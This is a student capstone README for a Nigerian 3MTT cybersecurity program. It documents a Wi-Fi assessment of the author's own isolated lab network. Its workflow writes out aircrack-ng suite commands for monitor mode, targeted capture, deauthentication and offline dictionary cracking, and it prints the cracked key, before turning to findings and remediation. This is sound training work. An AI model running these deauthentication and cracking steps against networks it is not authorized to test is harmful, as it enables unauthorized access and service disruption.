CS-12 Wi-Fi Security Assessment
3MTT NextGen Cohort Capstone Project
Fellow: Adama Nuhu
Fellow ID: FE/26/4246539238
Program: Federal Ministry of Communications, Innovation & Digital Economy — 3 Million Technical Talents (3MTT)
Track: Cybersecurity
Status: ✅ Completed
________________________________________
📋 Project Overview
An ethical, lab-based wireless security assessment conducted on an isolated, self-owned network environment. This capstone demonstrates proficiency in network reconnaissance, vulnerability identification, evidence collection, and remediation hardening — core competencies for entry-level cybersecurity operations.
Target Network: Devil_Apprentice (BSSID: D8:50:A1:07:E9:FE)
Assessor: Adama Nuhu
Assessment Date: August 2026
Environment: Isolated lab — no internet uplink, owned equipment only
________________________________________
🎯 Objectives
1.	Scan & Enumerate — Discover and map the target wireless network, clients, and encryption protocols.
2.	Identify Vulnerabilities — Detect weak configurations susceptible to real-world attack vectors.
3.	Capture Evidence — Document findings with reproducible technical evidence.
4.	Remediate & Harden — Apply industry-standard fixes and verify resilience.
5.	Deliver Professional Report — Produce a structured assessment report and walkthrough video.
________________________________________
🛠️ Tools & Technologies
Category	Tools
OS & Platform	Kali Linux (Live USB / VM)
Wireless Adapter	Realtek RTL8821CU (monitor mode capable)
Reconnaissance	airodump-ng, wash
Attack / Testing	aireplay-ng, reaver
Offline Analysis	aircrack-ng
Wordlists	Custom dictionary (wifi_crack.txt)
Router Admin	Web-based AP management panel
Documentation	Markdown, OBS Studio (video)
________________________________________
🔍 Assessment Workflow
Phase 1: Interface Preparation
sudo airmon-ng check kill
sudo airmon-ng start wlan0
•	Killed conflicting processes
•	Enabled monitor mode on wlan0 → wlan0mon
Phase 2: Passive Discovery
sudo airodump-ng wlan0
•	Detected multiple nearby APs (passive observation only)
•	Identified target Devil_Apprentice on Channel 3
Phase 3: Targeted Capture
sudo airodump-ng --bssid D8:50:A1:07:E9:FE -c 3 -w Devil_Apprentice wlan0
•	Locked to target BSSID and channel
•	Captured beacon frames and client association data
Phase 4: Deauthentication & Handshake Capture
sudo aireplay-ng -0 11 -a D8:50:A1:07:E9:FE -c <CLIENT_MAC> wlan0
•	Forced 4-way handshake re-negotiation
•	Captured EAPOL frames for offline cracking
Phase 5: Offline Password Cracking
# Corrected syntax (initial run missed -b flag)
sudo aircrack-ng -a2 -b D8:50:A1:07:E9:FE -w wifi_crack.txt Devil_Apprentice-02.cap
•	Result: KEY FOUND! [ Orijin@bitters ]
•	Crack time: ~0 seconds (dictionary match)
________________________________________
⚠️ Key Findings
ID	Finding	Severity	CVSS 3.1
WIFI-001	Weak WPA2-PSK susceptible to dictionary attack	High	7.5
WIFI-002	4-Way Handshake exposed to offline cracking	High	—
WIFI-003	No 802.11w (PMF) — deauth frames accepted	Medium	—
________________________________________
🔒 Remediation Applied
Control	Before	After
Wi-Fi Password	Orijin@bitters (cracked)	20+ character random passphrase
Encryption	WPA2-PSK	WPA3-SAE / WPA2-AES only
WPS	Enabled	Disabled
802.11w (PMF)	Not configured	Required
Router Admin Password	Default / weak	Strong unique password
Remote Management	Potentially enabled	Disabled
Verification: Post-hardening re-capture and re-test confirmed the dictionary attack failed against the new passphrase.
________________________________________
📁 Deliverables
Deliverable	Status	Link
Assessment Report	✅ Complete	CS12_WiFi_Security_Assessment_Report.md

Walkthrough Video Script	✅ Complete	CS12_Walkthrough_Video_Script.md

Safe-Lab Evidence	✅ Complete	Photos & authorization statement included in report
Remediation Guide	✅ Complete	Section 5 of report
Portfolio Website	✅ Complete	index.html

________________________________________
🎓 Program Context
This project was completed as the capstone requirement for the 3MTT NextGen Cohort, an initiative of the Federal Ministry of Communications, Innovation & Digital Economy (FMCIDE), Nigeria, designed to build 3 million technical talents across critical digital economy sectors including cybersecurity, software development, AI/ML, and cloud computing.
•	Fellow: Adama Nuhu
•	Fellow ID: FE/26/4246539238
•	Cohort: NextGen
•	Focus Area: Cybersecurity — Network Security & Ethical Hacking
________________________________________
⚖️ Ethics & Legal Compliance
All testing was conducted exclusively against equipment owned and operated by the assessor (Adama Nuhu).
The lab environment was physically isolated with no WAN/internet uplink.
Neighboring networks detected during passive scanning were not subjected to any active testing, deauthentication, or intrusion attempts.
This assessment adheres to the Nigerian Cybercrimes Act and ethical hacking best practices.
________________________________________
📬 Connect
•	LinkedIn: linkedin.com/in/adamanuhu
•	Email: adama.nuhu@miva.edu.ng
•	3MTT Profile: Fellow ID FE/26/4246539238
________________________________________
Built with discipline, documented with integrity, hardened with purpose.
